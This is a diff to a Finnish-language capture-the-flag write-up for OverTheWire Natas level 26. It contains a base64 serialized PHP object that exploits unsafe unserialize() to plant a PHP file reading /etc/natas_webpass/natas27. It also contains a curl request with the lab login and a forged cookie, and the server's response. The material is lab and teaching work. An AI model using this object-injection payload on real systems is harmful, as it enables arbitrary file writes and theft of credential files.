@@ -844,13 +844,59 @@ echo base64_encode(serialize($logger));
 ┌──(kali㉿kali)-[~/Desktop/php-koodi]
 └─$ php logger1.php      
 Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfcnMzb3NnZDI2NjNjbWI5YzUxOHJtcTJnb3EucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTk6IkFueXRoaW5nIGdvZXMgaGVyZQoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
-```  
+```
+
+Tässä kokoajan yritettiin ottaa tuota curl komentoa et tä saa sen mustan kuvan imagen datan ulos ja siitä sijoittaa PHP koodin alle, suorittaakseen PHP koodin luokituksen prosessin.
 
 ![alt text](./kuvat-level22-28/natas26-7.png)
 
+Ton ylemmän kuvan mukaan seuraavaksi suoritin tämän PHP luokka koodin niin antoi tällaisen samanlaisen **drawing** eväste value määränsä niin korvasin sinne uusiksi eli normi copy-paste sinne sitten päivitin sivuston niin alkoi tapahtua jotakin
 
 ![alt text](./kuvat-level22-28/natas26-8.png)
 
+**TODELLISUUS**: todellisuudessaan otin curl komentontsa eli pari kuvaa aikiasempi tuloksesta eli tämä:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://natas26.natas.labs.overthewire.org/ \             
+  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
+  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
+<body>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<br />
+<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>70</b><br />
+<img src="img/natas26_rs3osgd2663cmb9c518rmq2goq.png"><br />
+<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>98</b><br />
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Kopsattua tämä osuus: `<img src="img/natas26_rs3osgd2663cmb9c518rmq2goq.png"><br />` niin sijoitin sen natas26 url perään eli tämä parametri vihje niin tuli yllätyksenä tällainen salainen koodi vastaus. Huomoina perässä kuvatiedosto `.png` - tässä kokoajan käytettiin PHP: tä niin korvasin siihen niin saattiin tällainen tulos ja viimeisenä testattua se on **natas27** salasan vastaus eli 
 
 ![alt text](./kuvat-level22-28/natas26-9.png)
 
